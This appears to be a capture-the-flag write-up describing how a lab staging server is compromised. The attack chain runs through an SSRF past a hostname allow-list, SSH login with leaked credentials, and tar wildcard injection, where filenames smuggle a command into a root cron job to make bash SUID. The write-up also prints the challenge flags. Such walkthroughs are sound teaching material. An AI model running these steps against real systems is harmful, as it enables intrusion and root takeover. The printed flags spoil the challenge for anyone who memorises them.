# Operation Coldstart - Challenge Writeup

**Target IP:** 10.49.166.120
**Objective:** Demonstrate full compromise of the Volt Labs staging server.

---

## 1. Enumeration

### Port Scanning
An initial Nmap scan was performed to identify open ports and services:
```bash
nmap -sC -sV -oN nmap_initial.txt 10.49.166.120
```
**Results:**
- **21/tcp (FTP):** vsftpd 3.0.5 (Anonymous login allowed)
- **22/tcp (SSH):** OpenSSH 9.6p1
- **80/tcp (HTTP):** Gunicorn (URL Preview Service)

### FTP Enumeration
Anonymous access to the FTP server revealed a backup file:
```bash
curl -s ftp://anonymous:anonymous@10.49.166.120/pub/backup.tar.gz -o backup.tar.gz
tar -xzvf backup.tar.gz
```
The archive contained the source code for the web application: `app.py`, `README.md`, and `requirements.txt`.

---

## 2. Vulnerability Analysis (SSRF)

Reviewing `app.py` revealed a URL Preview service built with Flask.

**Vulnerable Code Snippet:**
```python
@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    # ... (omitted) ...
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS: # ALLOWED_HOSTS = {"kestrel.thm"}
        return page("Preview Blocked", ...), 403

    try:
        r = requests.get(target, timeout=3)
        # ... returns target content ...
```
The application implemented an allow-list for the `hostname`, but it did not restrict the scheme or path. Crucially, it allowed access to `kestrel.thm`, which resolved to `127.0.0.1` internally.

An admin endpoint was also found in the code, restricted to local requests:
```python
@app.route("/admin/notes")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    # ... reads /opt/voltlabs-preview/admin_notes.txt ...
```

---

## 3. Exploitation & Initial Access

### Exploiting SSRF
By providing a URL targeting the internal hostname and the admin notes path, the internal notes were retrieved:
```bash
curl -s "http://10.49.166.120/preview?url=http://kestrel.thm/admin/notes"
```
**Discovered Credentials:**
- **User:** `webdev`
- **Password:** `V0ltLabs#summer`

### SSH Login
Using the discovered credentials, SSH access was established:
```bash
sshpass -p 'V0ltLabs#summer' ssh webdev@10.49.166.120
```
The user flag was found in `user.txt`:
**User Flag:** `THM{96dc7bd50d2fb98fcece01560788b5ab}`

---

## 4. Privilege Escalation

### Enumeration
Checking for scheduled tasks revealed a root cron job in `/etc/cron.d/voltlabs-backup`:
```text
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
The `webdev` user had full write permissions to the `/opt/backups` directory. Because the command uses a wildcard (`*`), it is vulnerable to a **Tar Wildcard Injection** attack.

### Exploitation (Tar Wildcard)
I created a script to set the SUID bit on `/bin/bash` and used `tar`'s command-line flags (passed as filenames) to execute it:

1.  **Create the payload script:**
    ```bash
    echo "chmod +s /bin/bash" > /opt/backups/shell.sh
    chmod +x /opt/backups/shell.sh
    ```
2.  **Create the "flag" files for tar:**
    ```bash
    touch /opt/backups/--checkpoint=1
    touch "/opt/backups/--checkpoint-action=exec=bash shell.sh"
    ```

After the cron job executed (within one minute), `/bin/bash` became SUID:
```bash
ls -la /bin/bash
# Output: -rwsr-sr-x 1 root root ... /bin/bash
```

### Root Flag
Root access was gained using the SUID bash:
```bash
/bin/bash -p
cat /root/flag.txt
```
**Root Flag:** `THM{e6ee84a483d67ade06936fcfd1433e8a}`

---

## 5. Cleanup
Exploit files were removed from `/opt/backups` to leave the system in a clean state:
```bash
rm /opt/backups/shell.sh /opt/backups/--checkpoint=1 "/opt/backups/--checkpoint-action=exec=bash shell.sh"
```
